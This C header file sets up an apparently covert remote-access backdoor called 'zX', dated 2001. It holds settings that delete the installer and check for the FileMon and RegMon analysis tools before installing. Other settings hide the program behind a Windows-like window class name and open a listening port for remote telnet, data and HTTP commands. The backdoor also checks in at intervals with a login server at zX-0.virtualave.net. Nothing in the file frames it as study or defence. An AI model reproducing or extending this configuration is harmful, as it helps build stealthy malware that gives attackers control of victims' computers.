#ifndef defines_h
#define defines_h

/* build type */
//#define TestBuild
//#define SpecialBuild
//#define CustomBuild
/*#define DefaultBuild*/

#define zXver_str   "zX_v0.7.1c"   /* zX version string */
#define zXver_date  "05sep2k1"     /* zX build date */
#define zXver_num   0x00010905     /* zX version number [00YYMMDD] */


#ifdef  SpecialBuild
  #define zXver   zXver_str "#" "[" zXver_date "]"
#endif
#ifdef  TestBuild
  #define zXver   zXver_str "t" "[" zXver_date "]"
#endif
#ifdef  CustomBuild
  #define zXver   zXver_str "?" "[" zXver_date "]"
#endif

#ifndef   zXver
  #define zXver   zXver_str "!" "[" zXver_date "]"
#endif

#ifdef CustomBuild

	#define noCheck4Connection  /* don't check if online before starting to listen */
	#define noDeleteInstaller   /* don't delete the installer executable */
	#define noChk4version       /* add to make zX not check for current version */

	#define noSilentCrash	      /* dont show the error dialog box on crashing */
	//#define noChk4FileMon     /* check for filemon before installing */
	//#define noChk4RegMon      /* check for regmon before installing */
	//#define runLowPriority    /* run at idle priority */
	//#define showLoginTimeMbx	/* show time taken to login */
	//#define loginOnStartup		/* attempt login without checking if online [for local login server] */

#endif


#ifdef TestBuild

	#define noCheck4Connection  /* don't check if online before starting to listen */
	#define noDeleteInstaller   /* don't delete the installer executable */
	#define noChk4version       /* add to make zX not check for current version */

	#define noSilentCrash	      /* dont show the error dialog box on crashing */
	#define noChk4FileMon       /* check for filemon before installing */
	#define noChk4RegMon        /* check for regmon before installing */
	
  //#define runLowPriority    /* run at idle priority */
	//#define showLoginTimeMbx	/* show time taken to login */
//	#define loginOnStartup		  /* attempt login without checking if online [for local login server] */

//  #define LoginServer         "127.0.0.1"
//  #define LoginCGI           "/cgi-bin/index.cgi"

//  #define LoginDelay          60000/*ms*//* 1m */

#endif

#ifdef SpecialBuild

	#define noCheck4Connection  /* don't check if online before starting to listen */
	#define noDeleteInstaller   /* don't delete the installer executable */
	//#define noChk4version       /* add to make zX not check for current version */

	#define noSilentCrash	      /* dont show the error dialog box on crashing */
	//#define noChk4FileMon     /* check for filemon before installing */
	//#define noChk4RegMon      /* check for regmon before installing */
	//#define runLowPriority    /* run at idle priority */
	//#define showLoginTimeMbx	/* show time taken to login */
	//#define loginOnStartup		/* attempt login without checking if online [for local login server] */

#endif

#ifndef LoginServer
  #define LoginServer			  "zX-0.virtualave.net"
#endif
#ifndef LoginServerPort
  #define LoginServerPort   80
#endif
#ifndef LoginCGI
  #define LoginCGI         "/index.cgi"
#endif

#ifndef CheckForNetDelay
  #define CheckForNetDelay  15000/*ms*//* 15s */
#endif
#ifndef LoginDelay
  #define LoginDelay        600000/*ms*//* 10m */
#endif
#ifndef LoginFailedDelay
  #define LoginFailedDelay  120000/*ms*//*  2m */
#endif


#define zXport	  				  2857 /*MUST be made randomized*/

#define caseSensitiveCommands	/* case sensitive command interpretation */


#define MaxNumOfConnections		                 32 /* MaxMaxNumOfConnections = 256 */
#define MaxNumOfDataConnections	              128
#define MaxNumOfCommandThreads	              128
#define MaxNumOfCommandThreadsPerConnection	   16
						/* MaxMaxNumOfCommandThreadsPerConnection=MAXIMUM_WAIT_OBJECTS=64; */

/*
typedef unsigned short    u_short;
typedef unsigned long     u_long;
typedef unsigned int      u_int;
*/

#define zXClassName	    "MSTaskMon_Main"
#define zXWindowName		""

#define zXmsg_base        0x8000 /* to +0x3fff can be used*/

#define zXmsg_newConn     0x8000
#define zXmsg_socket      0x8001
#define zXmsg_socket_max  0x8020

/*
const u_int	zXmsg_newConn		  = zXmsg_base;
const u_int	zXmsg_socket      = zXmsg_base + 1;
const u_int	zXmsg_socket_max  = zXmsg_base + MaxNumOfConnections;
*/

#define zXmsg_server             0xBFFF
  #define zXmsg_newVersion       0x00142857
  #define zXmsg_getVersion       0x00285714
  #define zXmsg_svrShutdown      0x00428571

/* the timer ids */
#define zXtimer_checkForNet     1
#define zXtimer_relogin         2

#define MemPageSize			        4096
#define SizeConnectionData	    MemPageSize
#define SizeCommandData		      MemPageSize

#define zXbufSize               1024  //must be less than ConnBufSize

#define MaxCmdLen               1024
#define MaxHostNameLen           300
#define MaxPath                  300
#define	MaxNumOfAliases		        10
#define MaxAliasedCommandLength	  20
#define MaxUrlLen                256

#define ConnBufSize             4082/*SizeConnectionData-14*//*-sizeof(SOCKET)-sizeof(u_short)-sizeof(u_int)-sizeof(u_int)*/
#define HttpBufSize             ConnBufSize

#define MaxPromptLength		       20
#define zXdefaultPrompt         "?:"

#define ConnectionTimeOut		    10000//3000//ms
#define initCurrentDirectory	  "C:\\"
#define initPrevCommand			    "dl"

#define ChkConnType_teln        '~'/*"~"*/
#define ChkConnType_data        "_zX]"
#define ChkConnType_http        "GET /~/"

#define ConnType_none     0 /* 'not_connected' (unauthorized, so far) */
#define ConnType_teln     1
#define ConnType_data     2
#define ConnType_http     3

#define DefaultThreadWaitTimeout	10000//ms

#endif